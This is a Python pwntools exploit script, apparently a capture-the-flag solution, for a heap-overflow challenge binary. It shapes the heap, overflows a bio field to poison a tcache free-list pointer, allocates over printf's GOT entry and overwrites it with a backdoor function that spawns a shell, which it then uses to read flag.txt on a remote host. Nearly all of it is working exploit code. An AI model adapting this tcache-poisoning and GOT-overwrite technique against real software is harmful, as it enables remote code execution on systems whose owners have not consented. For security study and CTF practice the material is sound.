#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./heap_overflow', checksec=False)
backdoor   = elf.sym['backdoor']
printf_got = elf.got['printf']
system_got = elf.got['system']

# TARGET must cover printf@got in the 0x20-byte name field, but not system@got
TARGET = printf_got
assert printf_got in range(TARGET, TARGET + 0x20)
assert system_got not in range(TARGET, TARGET + 0x20)

log.success(f'printf@got={printf_got:#x}  TARGET={TARGET:#x}')

# io = process(['./ld-2.31.so', '--library-path', '.', './heap_overflow'])
io = remote('<host-ip>', port)

PW = b'tpw'

def create(name, pw=PW, bio=b'bio', tag=b'tag'):
    io.sendlineafter(b'> ', b'1')
    io.sendafter(b'name > ',     name + b'\n')
    io.sendafter(b'password > ', pw   + b'\n')
    io.sendafter(b'bio > ',      bio  + b'\n')
    io.sendafter(b'tagline > ',  tag  + b'\n')

def delete(i):
    io.sendlineafter(b'> ', b'2')
    io.sendafter(b'index > ',    str(i).encode() + b'\n')
    io.sendafter(b'password > ', PW + b'\n')

def edit_overflow(i, payload):
    io.sendlineafter(b'> ', b'4')
    io.sendafter(b'index > ',     str(i).encode() + b'\n')
    io.sendafter(b'password > ',  PW + b'\n')
    io.sendafter(b'new name > ',  b'x\n')
    io.sendafter(b'new bio > ',   payload)              # exactly 0x60
    io.sendafter(b'new tagline > ', b'y\n')

# ---- heap layout: [p0][bio0][p1][bio1][p2][bio2][p3][bio3][p4][bio4] ----
create(b'n0'); create(b'n1'); create(b'n2'); create(b'n3'); create(b'n4')

# ---- 2 frees → tcache[0x70] count=2, tcache[0x50] count=2 ----
delete(4)
delete(3)

# ---- overflow bio2: p3.fd = TARGET (p3 chunk header sits 0x40 past bio2 userdata) ----
payload = b'A'*0x48 + p64(0x71) + p64(TARGET) + b'B'*8
edit_overflow(2, payload)

# ---- step 4: pops p3 (count 2→1); TARGET becomes tcache head ----
create(b'n5')

# ---- step 5: malloc(0x60) pops TARGET (count 1→0), p = TARGET = printf@got ----
io.sendlineafter(b'> ', b'1')
# short write: send exactly 8 bytes; read() returns after those 8 bytes
io.sendafter(b'name > ', p64(backdoor))

# now printf("password > ") jumps through printf@GOT = backdoor → system("/bin/sh")
io.sendline(b'cat flag.txt')
io.interactive()
